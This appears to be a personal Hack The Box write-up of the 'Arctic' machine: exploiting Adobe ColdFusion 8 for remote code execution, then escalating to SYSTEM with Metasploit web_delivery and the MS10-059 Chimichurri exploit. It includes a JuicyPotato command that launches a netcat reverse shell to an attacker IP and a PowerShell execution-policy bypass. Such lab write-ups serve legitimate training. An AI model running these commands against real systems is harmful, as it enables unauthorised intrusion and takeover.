#hackthebox 

# Initial Nmap Scan

![Pasted image 20230226110151](https://user-images.githubusercontent.com/71300144/221433773-e26c450b-caeb-4565-812a-b4cdf05c9629.png)

Right away the port 8500 sticks out to me

## All port scan

Nothing came up different

![Pasted image 20230226111747](https://user-images.githubusercontent.com/71300144/221433803-d3c415df-0727-4123-a0c6-bd9937439305.png)

# Checking out Port 8500
![Pasted image 20230226110422](https://user-images.githubusercontent.com/71300144/221433825-5702e1c9-c923-46f9-9043-3051a8358ca3.png)

![Pasted image 20230226110716](https://user-images.githubusercontent.com/71300144/221433845-9d9f6436-2f8e-454e-a1f8-badb97a0343f.png)

- After Some googoling I found out some information after trying some manual enumeration and looking up default Credentials

	- After changing the root administrator username, the ColdFusion 8 Administrator login screen will still display the default value admin in the User name field. If single password authentication is enabled, pressing the Login button will simply submit the root administrator password. If separate username and password authentication is enabled for the ColdFusion 8 Administrator, the new username will be able to log in successfully (using the root administrator password), and the default admin username will fail.
	https://helpx.adobe.com/coldfusion/kb/coldfusion-8-change-root-administrator.html

- After noticing that the default password was submitted and available to copy / save, I saved the password and coppied it in my terminal to see what is was

	- The default root password > 'A53DD890D2F4D7CCB5FDAF668FAA662EE0E75848' but this does not matter because everytime you try to login the password will rotate with random numbers and letters. From here I chose to move on and look for any exploits for Adobe ColdFusion 8


# Searchsploit 

![Pasted image 20230226111934](https://user-images.githubusercontent.com/71300144/221433857-c532813d-1997-4eab-aee2-a3aa45e3cbfa.png)


- I chose to try 'Adobe ColdFusion 8 - Remote Command Execution (RCE)'

Having a look through the code I made some slight modifications to the lhost, lport, and rhost

![Pasted image 20230226112420](https://user-images.githubusercontent.com/71300144/221433873-51109f1a-4ccf-4770-9c36-333164479b92.png)

After reading throught the code, and changing the host values, it looks like all you have to do from there is fire it off.
- You dont even have to set up a netcat listener, it does it for you.

![Pasted image 20230226113408](https://user-images.githubusercontent.com/71300144/221433885-d10ddfd9-6418-4e6f-86ad-316dea8f6c38.png)
![Pasted image 20230226113432](https://user-images.githubusercontent.com/71300144/221433909-d385f6ae-052b-40cf-9bd5-b52e65b17a46.png)
![Pasted image 20230226113500](https://user-images.githubusercontent.com/71300144/221433925-9da1a001-c487-4a26-87f6-edb8c4658301.png)

There we go, we have a foothold

# Post Exploitation / Enumeration

![Pasted image 20230226113932](https://user-images.githubusercontent.com/71300144/221433938-fb6345ce-ffb1-4506-bab9-db01b2a91712.png)

SeImpersonatePrivilege was set, time to look at a Juicy Potato exploit (token Impersonation)

``./juicypotato.exe -l 6666 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\Users\tolis\Downloads\nc.exe -e cmd.exe 10.10.14.7 9002" -t *`

- I tried the command above multiple times but could not get it to work in my shell. so I decided to go over to metasploit.

# Metasploit

- Search web_delivery
- Use multi/script/web_delivery
- set lhost, lport, and srvport if you need
- change exploit target from python to powershell
- set payload to applicable based on system info
	- windows/x64/meterpreter/reverse_tcp
- run the exploit
- paste output in the shell you already have
- you should get a meterpreter session

![Pasted image 20230226121856](https://user-images.githubusercontent.com/71300144/221433976-296d907f-628a-4306-9cdf-4f31bee877eb.png)
![Pasted image 20230226121951](https://user-images.githubusercontent.com/71300144/221433990-b134d2d6-3f55-4c95-bd67-5a82a6c2b688.png)

paste the payload and hit enter
![Pasted image 20230226122026](https://user-images.githubusercontent.com/71300144/221434016-df62b789-8f08-435f-a62a-ea3d3bdcb7aa.png)
![Pasted image 20230226122040](https://user-images.githubusercontent.com/71300144/221434025-6d33f9d7-d849-4013-bd0e-3b78e7a3dea5.png)
you should now have a meterpreter session

![Pasted image 20230226122209](https://user-images.githubusercontent.com/71300144/221434041-cedbc062-533d-4089-98b0-bda27cd5b7f5.png)

I then loaded Incognito mode which will allow me to impersonate any tokens that are available to do so
![Pasted image 20230226122740](https://user-images.githubusercontent.com/71300144/221434051-e5d3cce6-6b0c-4f2b-9b31-3fd1bf098a27.png)

![Pasted image 20230226122801](https://user-images.githubusercontent.com/71300144/221434065-293f2e2b-5d1a-499e-b115-6899f20a2578.png)

There are no tokens available to impersonate..... looks like I fell into a rabit hole, time to start enumerating further

# Post Enumeration

Decided to upload PowerUp.ps1 for furhter enumeration

![Pasted image 20230226123503](https://user-images.githubusercontent.com/71300144/221434091-591ec41a-4621-46f1-a3f9-adbab97b9e69.png)

![Pasted image 20230226123611](https://user-images.githubusercontent.com/71300144/221434110-f4ea4b5e-c883-4413-9ec7-9b3baeaf5ee1.png)

Next run PowerUp.ps `powershell -ep bypass .\PowerUp.ps1`

![Pasted image 20230226123653](https://user-images.githubusercontent.com/71300144/221434139-97330e9e-8f1f-4e2f-8951-a5261c1d9789.png)

PowerUp seemed to comeup with nothing intersting, so after about and hour of manual enumeration and fumbling around in google I came across windows-exploit-suggester, downloaded it and ran it against the systeminfo collected from Arctic

![Pasted image 20230226132958](https://user-images.githubusercontent.com/71300144/221434159-f62f5e7a-cc42-44ea-95af-d5cfe3a0ee61.png)

- Again researching some of the exploits suggested MS11-011, MS10-073, etc proved to bring up nothing I personally could take advantage of / out of my range of understanding, until I got to **MS10-59 which provided an ip address and listening port 
- It is also mentioned that this exploit should be run by a user with impersonate privileges!! I found that earlier when attempting a potato attack

![Pasted image 20230226133631](https://user-images.githubusercontent.com/71300144/221434179-7bd7f8e9-9a3e-40a8-9c23-844d967af197.png)

- I downloaded the file from https://github.com/egre55/windows-kernel-exploits/blob/master/MS10-059:%20Chimichurri/Compiled/Chimichurri.exe
- uploaded it to via my meterpreter session 

![Pasted image 20230226134317](https://user-images.githubusercontent.com/71300144/221434195-252b34c4-187e-4ae5-82d9-f3c3997881c6.png)

- Set up a net cat listener on port 9003 and ran the exploit and got a shell 'nt Authority/system'

![Pasted image 20230226134423](https://user-images.githubusercontent.com/71300144/221434221-7f5ec125-a8dc-463f-ae14-e478740b07ef.png)

# Box Owned
***

